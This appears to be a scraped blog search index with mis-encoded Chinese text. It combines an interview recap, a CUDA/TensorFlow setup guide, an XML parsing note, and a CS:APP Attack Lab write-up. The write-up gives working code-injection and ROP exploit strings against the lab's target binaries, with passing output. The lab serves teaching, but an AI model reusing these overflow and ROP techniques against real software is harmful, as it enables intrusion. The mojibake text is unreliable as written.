æ›´ç®€å•,åœ¨å›½å†…è®¿é—®ä¹Ÿæ›´å¿«. ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:9:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["é¢ç»"],"content":"ç¬¬ä¸€è½®é¢è¯• é¦–å…ˆè‡ªæˆ‘ä»‹ç» ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:0:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"å¼€å‘çŸ¥è¯† é—®æˆ‘æ¯”è¾ƒç†Ÿæ‚‰ä»€ä¹ˆè¯­è¨€ï¼Œç­”Javaï¼Œé‚å¼€å§‹é—®Javaã€‚ è®²è®²HashMapå®ç°åŸç†ï¼ŒHashTableå’ŒHashMapæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ è®²è®²ConcurrentHashMapæ€ä¹ˆå®ç°çš„ï¼Œæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ Objectçš„wait()å’Œnotify()æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ è®²è®²Jvmå†…å­˜ç»“æ„ã€‚ synchronizedå’ŒLockåœ¨ API/ä½¿ç”¨ä¸Šæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ äº†è§£è¿‡Rediså—ï¼ŒRedisæœ‰å“ªäº›å¸¸è§æ•°æ®ç»“æ„ï¼Ÿ å‰©ä½™çš„è®°ä¸æ¸…äº†â€¦ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"ç®—æ³•é¢˜ å¦‚ä½•åˆ¤æ–­ä¸¤ä¸ªå•é“¾è¡¨æ˜¯å¦æœ‰äº¤ç‚¹ï¼Œå•é“¾è¡¨æ˜¯å¦æˆç¯ï¼Ÿ nä¸ªäºŒæç®¡ï¼Œè¶…è¿‡n/2ä¸ªäºŒæç®¡æ˜¯å¥½çš„ã€‚ä¸¤ä¸ªäºŒæç®¡å¯ä»¥ç›¸äº’åˆ¤æ–­å¯¹æ–¹æ˜¯å¥½è¿˜æ˜¯åï¼Œå¥½çš„äºŒæç®¡ç»™çš„åˆ¤æ–­ä¸€å®šæ˜¯å‡†ç¡®çš„ï¼Œåçš„äºŒæç®¡ç»™å‡ºçš„ç»“æœæ˜¯ä¸å‡†ç¡®çš„ã€‚æ‰¾å‡ºæ‰€æœ‰å¥½çš„äºŒæç®¡ã€‚ å†™å‡ºäºŒå‰æ ‘çš„å±‚åºéå†ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"åé—® è¯·é—®å²—ä½å·¥ä½œå…·ä½“æ˜¯å¹²ä»€ä¹ˆï¼Ÿ ä¸€èˆ¬é¢è¯•å­¦ç”Ÿä¸»è¦è€ƒå¯ŸåŸºç¡€çŸ¥è¯†ï¼Œä¸ºå•¥æ²¡æœ‰è¯¢é—® OS/è®¡ç½‘çš„çŸ¥è¯†ï¼Ÿ ç­”ï¼šç›®å‰æ¯”è¾ƒéœ€è¦èƒ½å°½å¿«ä¸Šæ‰‹å·¥ä½œçš„å®ä¹ ç”Ÿï¼Œæ‰€ä»¥å…ˆè€ƒå¯ŸæŠ€æœ¯ã€‚ ç¬¬äºŒè½®é¢è¯• é¦–å…ˆè‡ªæˆ‘ä»‹ç» ç„¶åè¯¢é—®ä¸€ä¸‹å»å¹´åœ¨å¤´æ¡çš„å®ä¹ ç»å†ï¼Œè°ˆäº†ä¸€ä¸‹ç®€å†ä¸Šçš„å¤§ä½œä¸šã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"åŸºç¡€çŸ¥è¯† è®²è®²ç½‘ç»œçš„äº”å±‚æ¨¡å‹ç»“æ„ã€‚ è®²è®²ä¸‰æ¬¡æ¡æ‰‹ã€å››æ¬¡æŒ¥æ‰‹ã€‚ ä¸ºä»€ä¹ˆè¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹ï¼Ÿ è®²è®²çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«ï¼Ÿ è°ˆè°ˆå¯¹åç¨‹çš„ç†è§£ã€‚ çº¿ç¨‹é—´ä»€ä¹ˆæ—¶å€™äº§ç”Ÿæ­»é”ï¼Ÿå¦‚ä½•è¿›è¡Œæ­»é”é¿å…/é¢„é˜²ï¼Ÿ Javaæœ‰å“ªäº›å¸¸è§å®¹å™¨ï¼Ÿ ConcurrentHashMapåœ¨å¹¶å‘è®¿é—®æ—¶ç›¸è¾ƒäºHashTableæœ‰ä»€ä¹ˆç¼ºç‚¹ï¼Ÿ ä¸€æ—¶æ²¡æƒ³èµ·æ¥ï¼Œé¢è¯•å®˜æç¤ºäº†size()ï¼Œç„¶åæˆ‘è®²äº†ä¸‹ConcurrentHashMapåœ¨å¹¶å‘è®¿é—®æ—¶è°ƒç”¨size()çš„è¿‡ç¨‹åŠoverheadã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:4:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"ç®—æ³•é¢˜ å†™ä¸€ä¸ªäºŒå‰æ ‘å·¦è§†å›¾ åˆšå¼€å§‹æƒ³åˆ°å±‚åºéå†ï¼Œç„¶ååªè®°å½•æ¯å±‚ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåæ¥é¢è¯•å®˜æç¤ºæˆ‘ç®€åŒ–ï¼Œå†™æˆé€’å½’ç‰ˆæœ¬ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:5:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"æé—® ä¸»è¦å¼€å‘å†™ä»€ä¹ˆï¼Œç”¨ä»€ä¹ˆæŠ€æœ¯æ ˆï¼Ÿ HR é¢è¯• ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:6:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"HR é—® é¦–å…ˆè‡ªæˆ‘ä»‹ç» é—®æœ‰ä»€ä¹ˆçˆ±å¥½ï¼Ÿ å®ä¹ æ—¶é—´ï¼Œå¯¹æœªæ¥çš„èŒä¸šè§„åˆ’ï¼Ÿ ä¸Šæ¬¡å®ä¹ çš„ç»å†ï¼Œé‡åˆ°ä»€ä¹ˆå›°éš¾ï¼Ÿ æœ¬æ¬¡å®ä¹ é¢„è®¡å®Œæˆä»€ä¹ˆç›®æ ‡ å¯¹åŠ ç­çš„æƒ³æ³•ï¼Œæ¥æ”¶åº¦ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:7:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"æé—® å®ä¹ åœ°ç‚¹ æœ€ç»ˆåœ¨4-25æ”¶åˆ°äº† offer callï¼Œç¡®è®¤äº†ä¸€ä¸‹è–ªèµ„ç¦åˆ©ï¼Œå®ä¹ æ—¶é—´ç­‰ã€‚æ€»çš„æ¥è¯´ï¼Œä»Šå¹´æ˜¥æ‹›å®ä¹ æŠ•é€’ç»å†ä¸»è¦æ˜¯ç§¯æ”’ç»éªŒäº†ï¼Œæœ€å¼€å§‹çš„ä¸¤å®¶å‡†å¤‡ä¸è¶³ï¼Œè¢«æŒ‚çš„æŒºæƒ¨ã€‚ä¹‹åé¢å‘é¢è¯•å­¦ä¹ äº†ä¸€æ®µæ—¶é—´æ‰æ‹¿åˆ°è¿™ä¸ª offerã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:8:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["Linux"],"content":"æ˜¾å¡é©±åŠ¨ æœ€æ–°çš„ 18.04.3 å·²ç»å¯ä»¥å®‰è£… 430 é©±åŠ¨ sudo apt install nvidia-driver-430 å®‰è£…è¦æ±‚ å®˜ç½‘æœ‰å®‰è£…æ‰€éœ€è½¯ä»¶è¦æ±‚ å®‰è£… cuda åŠå…¶ç»„ä»¶ å»å®˜ç½‘ä¸‹è½½cuda å®‰è£… runfile åŠå…¶è¡¥ä¸ï¼Œ # Add NVIDIA package repository chmod +x ./cuda_10.0.130_410.48_linux.run ./cuda_10.0.130.1_linux.run sudo ./cuda_10.0.130_410.48_linux.run sudo ./cuda_10.0.130.1_linux.run æ³¨æ„ä¸è¦é‡å¤å®‰è£… nvidia æ˜¾å¡é©±åŠ¨ã€‚ ç„¶åä¸‹è½½cudnn. tar -zxvf cudnn-10.0-linux-x64-v7.6.2.24.tgz sudo cp cuda/include/cudnn.h /usr/local/cuda/include sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64 sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn* ç„¶åè®¾ç½®ç¯å¢ƒå˜é‡(cuda å®‰è£…å®Œæˆæ—¶ä¼šæç¤º) export PATH=/usr/local/cuda/bin/:$PATH export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/extras/CUPTI/lib64 æ£€éªŒä¸‹å®‰è£… wmc@omen:~$ nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2018 NVIDIA Corporation Built on Sat_Aug_25_21:08:01_CDT_2018 Cuda compilation tools, release 10.0, V10.0.130 Anaconda Anaconda å®‰è£…ååˆ†ç®€å•.å»å–œé—»ä¹è§çš„tunaä¸‹è½½ã€‚ chmod +x Anaconda3-2019.07-Linux-x86_64.sh ./Anaconda3-2019.07-Linux-x86_64.sh æ›´æ¢ anaconda å’Œ pip é•œåƒæº conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes pip install pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬ä½¿ç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„ python è™šæ‹Ÿç¯å¢ƒï¼Œå®‰è£… tensorflow-gpu. conda create -n tensor pip python=3.6 source activate tensor pip install --upgrade tensorflow-gpu ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:0:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å®‰è£… jupyter æ’ä»¶ conda install -c conda-forge jupyter_contrib_nbextensions jupyter contrib nbextension install --user ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:1:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å°† conda è™šæ‹Ÿç¯å¢ƒä½œä¸º jupyter å†…æ ¸ conda activate tensorflowenv pip install ipykernel python -m ipykernel install --user --name tensorflowenv --display-name \"Python (tensorflowenv)\" ç¤ºä¾‹æµ‹è¯• import tensorflow as tf mnist = tf.keras.datasets.mnist (x_train, y_train),(x_test, y_test) = mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0 model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(input_shape=(28, 28)), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation='softmax') ]) model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=5) model.evaluate(x_test, y_test) è¿è¡Œç»“æœ ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:2:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Python"],"content":"ç®€ä»‹ XML æ˜¯ä¸€ç§å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œè¢«ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚å®ƒæ˜¯ä¸€ç§æœ‰é€»è¾‘çš„æ ‘ç»“æ„ã€‚ ","date":"2018-12-09","objectID":"/posts/python-dataclean/:0:0","tags":["æ•°æ®æ¸…æ´—","XML"],"title":"Python ElementTreeæ•°æ®æ¸…æ´—","uri":"/posts/python-dataclean/"},{"categories":["Python"],"content":"Python ä½¿ç”¨ xml.ElementTree è§£æ import xml.etree.ElementTree as ET import codecs import json codecsç”¨äºæ‰“å¼€æ–‡ä»¶ï¼Œjsonç”¨äºä¿å­˜æ¸…æ´—å®Œçš„æ•°æ®ã€‚ tree = ET.parse() #è·å–ç›®å½•æ ‘ root = tree.getroot() #å¾—åˆ°æ ‘æ ¹ root = ET.fromstring() #ä»å­—ç¬¦ä¸²ç›´æ¥è§£æå‡ºæ ‘æ ¹ è·å–æ ‘æ ¹ï¼Œç„¶åè¿›è¡Œæ“ä½œ root.tag #rootå…ƒç´ çš„æ ‡è®°å root.attrib #rootå…ƒç´ çš„å±æ€§ï¼Œä¸ºä¸€ä¸ªdic for child in root: #ä¾¿åˆ©å­å…ƒç´  print(child.tag, child.attrib) root[0][1].text #å°†å…ƒç´ è§†ä¸ºå¤šç»´æ•°ç»„,ç”¨ä¸‹æ ‡è®¿é—® root.find(\"element\").text #æ‰¾å‡ºrootä¸‹elementä¸‹çš„å†…å®¹å­—ç¬¦ä¸² title = root.get(\"Title\") #è·å–rootå…ƒç´ çš„titleå±æ€§ for neighbor in root.iter('neighbor'): #éå†æ‰€æœ‰ç‰¹å®šå…ƒç´ ,é€’å½’åˆ°æ‰€æœ‰ï¼Œå­ã€å­™...å…ƒç´  print(neighbor.attrib) for country in root.findall('country'): #æ‰¾å‡ºæ‰€æœ‰countryå…ƒç´ ï¼Œä»…å­ä»£ rank = country.find('rank').text name = country.get('name') print(name, rank) for country in root.find('country'): #ä»…æ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆçš„å­ä»£ å…¶ä»–æ¶‰åŠçŸ¥è¯† import os def mkdir(path): #åˆ›å»ºæ–‡ä»¶å¤¹ if not os.path.exists(path): os.mkdir(path) for son_path in os.listdir(root_path): #éå†root_pathä¸‹çš„æ–‡ä»¶ json.dump(dic, file_obj, ensure_ascii=False, indent=4, separators=(',', ': ')) #å°†å­—å…¸dicè¾“å‡ºåˆ°æ–‡ä»¶file_objä¸­,ä¸å¯¹asciiè¿›è¡Œç¼–ç ,ç¼©è¿›4,åˆ†éš”ç¬¦ä¸º','ä»¥åŠ': ' æš‚æ—¶åˆ°æ­¤ ","date":"2018-12-09","objectID":"/posts/python-dataclean/:1:0","tags":["æ•°æ®æ¸…æ´—","XML"],"title":"Python ElementTreeæ•°æ®æ¸…æ´—","uri":"/posts/python-dataclean/"},{"categories":["CS:APP"],"content":"å®éªŒæè¿° æœ¬æ¬¡å®éªŒåˆ©ç”¨ç¨‹åºéœ€è¦å¤–éƒ¨è¾“å…¥çš„ç‰¹ç‚¹ï¼Œè¾“å…¥æœºå™¨ç å¯¹ç¨‹åºè¿”å›å€¼è¦†ç›–ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œå³åœ¨ getbuf å‡½æ•°éœ€è¦çš„è¾“å…¥ä¸­åšæ‰‹è„šï¼Œä»¥è‡´ä¸èƒ½æ­£å¸¸è¿”å›ï¼Œæ‰§è¡Œæ”»å‡»ä»£ç ã€‚ ç¬¬ä¸€é˜¶æ®µ ç¬¬ä¸€é˜¶æ®µä¸­æ ˆéšæœºåŒ–æœªå¼€æœºï¼Œå¯ä»¥å¾—çŸ¥å†…å­˜ä½ç½®çš„ç¡®åˆ‡åœ°å€ï¼Œä¸”æ ˆä¸­æœºå™¨ç å¯æ‰§è¡Œã€‚ é‚£ä¹ˆæˆ‘ä»¬å°†éœ€è¦æ‰§è¡Œçš„æ“ä½œç å’Œåœ°å€è¾“å…¥æœºå™¨ç å³å¯ã€‚ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:0:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_1 ç¬¬ä¸€å…³éå¸¸ç®€å•ï¼Œé¢˜ç›®ä¸»è¦æˆ‘ä»¬åœ¨ getbuf æ‰§è¡Œå®Œæˆåæ‰§è¡Œ touch1,touch1()æ— å‚ã€‚ (gdb) disas getbuf Dump of assembler code for function getbuf: 0x0000000000401688 \u003c+0\u003e: sub $0x18,%rsp 0x000000000040168c \u003c+4\u003e: mov %rsp,%rdi 0x000000000040168f \u003c+7\u003e: callq 0x4018ca \u003cGets\u003e 0x0000000000401694 \u003c+12\u003e: mov $0x1,%eax 0x0000000000401699 \u003c+17\u003e: add $0x18,%rsp 0x000000000040169d \u003c+21\u003e: retq End of assembler dump. (gdb) disas touch1 Dump of assembler code for function touch1: 0x00000000004016a0 \u003c+0\u003e: sub $0x8,%rsp 0x00000000004016a4 \u003c+4\u003e: movl $0x1,0x2029ee(%rip) # 0x60409c \u003cvlevel\u003e 0x00000000004016ae \u003c+14\u003e: mov $0x402e4e,%edi 0x00000000004016b3 \u003c+19\u003e: callq 0x400bd0 \u003cputs@plt\u003e 0x00000000004016b8 \u003c+24\u003e: mov $0x1,%edi 0x00000000004016bd \u003c+29\u003e: callq 0x401ab5 \u003cvalidate\u003e 0x00000000004016c2 \u003c+34\u003e: mov $0x0,%edi 0x00000000004016c7 \u003c+39\u003e: callq 0x400d60 \u003cexit@plt\u003e End of assembler dump. å¯ä»¥çœ‹åˆ°ï¼Œgetbuf å¼€å‡ºäº† 0x18ï¼Œå³ 24 å­—èŠ‚çš„ç©ºé—´ï¼Œtouch1 çš„åœ°å€ä¸º 0x4016a0ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€å¡«æ»¡è¿™ 0x28 ç©ºé—´ï¼Œå†ä»¥ touch1 åœ°å€æ›¿ä»£è¿”å›å€¼ã€‚æ³¨æ„ï¼šx86-64 æœºå™¨ä¸­ï¼Œé‡‡ç”¨å°ç«¯æ³•ï¼Œå…¶ä½ä½å­—èŠ‚å­˜æ”¾åœ¨ä½åœ°å€ï¼Œæ•…æˆ‘ä»¬è¾“å…¥æ•°æ®æ—¶ï¼Œå…ˆè¾“å…¥ä½ä½ã€‚ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0 16 40 00 00 00 00 00 è½¬æ¢åè¾“å…¥å³å¯ Cookie: 0x63149380 Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:1:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_2 ç¬¬äºŒå…³æ ¹æ®é¢˜æ„ï¼Œéœ€è¦è°ƒç”¨ touch2ï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°å€¼ï¼Œå…¶å€¼ä¸º cookieï¼ŒæŸ¥çœ‹ cookie æ–‡ä»¶ï¼Œå¦‚ä¸‹ã€‚ 2017211523@bupt3:~/target117$ cat cookie.txt 0x63149380 ä¸ºäº†ç»™ touch2 ä¼ å‚ï¼Œæˆ‘ä»¬éœ€è¦å°† cookie å€¼èµ‹ç»™%rdiï¼Œç„¶åå°† touch2 åœ°å€å‹æ ˆï¼Œä½¿ç”¨ ret å¼¹å‡º touch2 åœ°å€è¿”å›ï¼Œè°ƒç”¨ touch2ã€‚ mov $0x63149380,%rdi pushq $0x4016cc ret å°†å…¶ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶ä¹‹ååœ¨åæ±‡ç¼–ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿çŸ¥æŒ‡ä»¤çš„æœºå™¨ç æ˜¯å¤šå°‘ã€‚ phase2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 80 93 14 63 mov $0x63149380,%rdi 7: 68 cc 16 40 00 pushq $0x4016cc c: c3 retq æˆ‘ä»¬å°†æŒ‡ä»¤çš„æœºå™¨ç æ”¾åœ¨ getbuf æ—¶çš„æ ˆé¡¶ï¼Œç„¶åå°†è¿”å›å€¼ä½ç½®è®¾ç½®ä¸ºæ ˆé¡¶åœ°å€ï¼Œè¿™æ ·æ—¢å¯è¾¾åˆ°ç›®çš„ï¼Œè°ƒç”¨ getbuf æ—¶æ ˆé¡¶åœ°å€ä¸º 0x5566f7a8ã€‚ 48 c7 c7 80 93 14 63 68 cc 16 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 è¾“å…¥è¿è¡Œã€‚ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase2 | ./ctarget -q Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_3 æŸ¥çœ‹ touch3 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } å¯çŸ¥å…¶éœ€è¦ä¸€ä¸ªæŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆ svalï¼Œç„¶åè°ƒç”¨ hexmatchï¼Œå°† cookie å’Œ sval ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œéœ€è¦ hexomatch è¿”å›éé›¶å€¼ã€‚ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } ç”± hexmatch å¯çŸ¥ï¼Œå…¶æ¯”è¾ƒ cookie çš„å­—ç¬¦ä¸²è¡¨ç¤ºä¸ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰åˆ™è¿”å› 1ï¼Œé‚£ä¹ˆé—®é¢˜æ˜äº†ï¼Œæˆ‘ä»¬éœ€è¦å°†è¡¨ç¤º cookie çš„å­—ç¬¦ä¸²åœ°å€ä¼ ç»™ touch3ï¼Œä¸ç¬¬äºŒé¢˜ä¸åŒçš„æ˜¯å­—ç¬¦ä¸²éœ€è¦æœ‰ç©ºé—´ä¿å­˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸­æ‰¾å‡ºè°ƒç”¨ hexmatch æ—¶å€™æœªè¢«é‡å†™æ”¹å˜çš„ç©ºé—´ï¼Œå€Ÿä»¥ä¿å­˜å­—ç¬¦ä¸²ã€‚ mov $0x5566f7c8,%rdi pushq $0x4017a0 ret è¿™é‡Œæˆ‘ä»¬å°† cookie çš„å­—ç¬¦ä¸²è¡¨ç¤ºæ”¾åœ¨ 0x5566f7c8ï¼Œç¼–è¯‘å†åæ±‡ç¼–å¾—åˆ°æœºå™¨ç  phase3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 c8 f7 66 55 mov $0x5566f7c8,%rdi 7: 68 a0 17 40 00 pushq $0x4017a0 c: c3 retq æŸ¥è¡¨å¾—å‡º cookie å­—ç¬¦ä¸²çš„ 16 è¿›åˆ¶è¡¨ç¤ºä¸º 36 33 31 34 39 33 38 30ï¼Œæ³¨æ„ï¼šä»¥å­—ç¬¦ä¸²å½¢åŠ¿æ¯”è¾ƒæ—¶ä¸ç”¨å†åè½¬è¾“å…¥ï¼Œä¸”å­—ç¬¦ä¸²åº”æœ‰ç»“å°¾å­—ç¬¦â€˜\\0â€™ï¼Œå¾—åˆ°æ”»å‡»å­—ç¬¦ä¸²å¦‚ä¸‹ 48 c7 c7 c8 f7 66 55 68 a0 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 è½¬æ¢è¾“å…¥è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase3 | ./ctarget -q Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 ç¬¬äºŒé˜¶æ®µ åœ¨æ­¤é˜¶æ®µï¼Œç¨‹åºæ·»åŠ äº†ä¸¤ä¸ªç°ä»£è®¡ç®—æœºç¨‹åºå‡ ä¹å¿…é¡»çš„å¯¹æŠ—ç¼“ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„æªæ–½ï¼š 1.å‡½æ•°æ ˆéšæœºåŒ– ï¼Œæ— æ³•å†è·å–ç»å¯¹åœ°å€ã€‚ 2.æ ˆå†…å­˜çš„å†…å®¹è¢«é”å®šä¸ºä¸å¯æ‰§è¡Œã€‚ æ•…æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ ROP(é¢å‘è¿”å›ç¼–ç¨‹)ï¼Œå³ä½¿ç”¨ç¨‹åºä¸­æœ¬æ¥å°±å­˜åœ¨çš„ä»£ç ç»„æˆæˆ‘ä»¬éœ€è¦çš„æ“ä½œï¼Œå†å°†å…¶åœ°å€ä½œä¸ºè¿”å›å€¼ï¼Œä¸æ–­ç”¨ ret æŒ‡ä»¤è¿”å›å®Œæˆæ‰€éœ€æ“ä½œã€‚ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_4 æ­¤å…³éœ€ç”¨ ROP æ–¹æ³•å®Œæˆ phase_2 å†…å®¹ã€‚é‚£ä¹ˆå°±éœ€è¦åœ¨æ“ä½œä¸­å¾—åˆ° cookie å€¼ï¼Œé‚£ä¹ˆåªæœ‰ç”¨ pop æŒ‡ä»¤äº†ï¼Œéœ€è¦æŒ‡ä»¤ä¸ºã€‚ popq %rax movq %rax,%rdi ret æŸ¥æ‰¾å®˜æ–¹çš„ write upï¼Œå¾—çŸ¥å¯¹åº”æœºå™¨ç ï¼Œç„¶ååœ¨åœ¨ rtarget æ–‡ä»¶çš„åæ±‡ç¼–æ–‡ä»¶ä¸­åˆ©ç”¨ vim æŸ¥æ‰¾å¯¹åº”ä»£ç åœ°å€ã€‚å°†å…¶æ”¾å…¥æ”»å‡»å­—ç¬¦ä¸²ï¼Œå¾—åˆ°æ”»å‡»å­—ç¬¦ä¸²ä¸ºã€‚ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3c 18 40 00 00 00 00 00 /* popq rax */ 80 93 14 63 00 00 00 00 /* cookie */ 49 18 40 00 00 00 00 00 /* movq %rax,%rdi */ cc 16 40 00 00 00 00 00 /* touch2 */ è½¬æ¢è¾“å…¥è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase4 | ./rtarget Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! 